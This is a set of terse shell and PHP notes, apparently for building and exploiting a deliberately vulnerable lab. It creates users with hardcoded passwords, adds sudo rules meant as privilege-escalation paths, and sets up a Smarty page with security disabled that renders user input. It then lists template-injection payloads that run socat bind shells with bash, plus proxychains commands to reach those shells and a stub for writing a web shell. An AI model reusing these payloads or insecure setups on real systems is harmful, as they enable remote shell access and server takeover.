addgroup lanyangyang
adduser -D -G lanyangyang -s /bin/bash -h /home/lanyangyang lanyangyang
echo "lanyangyang:2pezUxZE8hq2TKC2IdBTk7k0" | chpasswd

# 注意!!表示上一条命令的完整内容
echo 'root:!!hello!!' | chpasswd


www-data ALL=(lanyangyang) NOPASSWD:/usr/bin/nice
lanyangyang ALL=(ALL) NOPASSWD:/usr/bin/arp-scan



root@localhost:/var/www/html# cp -r /tmp/smarty/libs ./smarty
root@localhost:/var/www/html# mkdir -p templates templates_c cache configs
root@localhost:/var/www/html# chmod -R 777 templates_c cache
root@localhost:/var/www/html# chown -R apache:apache /var/www/html

cat > /var/www/html/index.php << 'EOF'
<?php
require 'smarty/Smarty.class.php';

$smarty = new Smarty();

$smarty->setTemplateDir(__DIR__ . '/templates');
$smarty->setCompileDir(__DIR__ . '/templates_c');
$smarty->setCacheDir(__DIR__ . '/cache');
$smarty->setConfigDir(__DIR__ . '/configs');

$smarty->disableSecurity();

$user_input = $_GET['input'] ?? 'Hello World';
$smarty->assign('input', $user_input);

$smarty->display('index.tpl');
?>
EOF


file_put_contents('upload.php',base64_decode(''));


{{['socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane']|filter('system')}}
# 更稳定的监听方式
socat TCP-LISTEN:4444,fork,reuseaddr EXEC:'bash -li',pty,stderr,setsid,sigint,sane
{{['socat TCP-LISTEN:4444,fork,reuseaddr EXEC:'bash -li',pty,stderr,setsid,sigint,sane']|filter('system')}}
proxychains socat TCP:127.0.0.1:4444 SYSTEM:'bash -i',pty,stderr



{{['socat TCP-LISTEN:4446,fork,reuseaddr EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane']|filter('system')}}
proxychains socat TCP:127.0.0.1:4446 SYSTEM:'bash -i',pty,stderr
proxychains socat TCP:127.0.0.1:4446 PTY,link=/tmp/tty$$,raw,echo=0 SYSTEM:'bash -li',pty,stderr
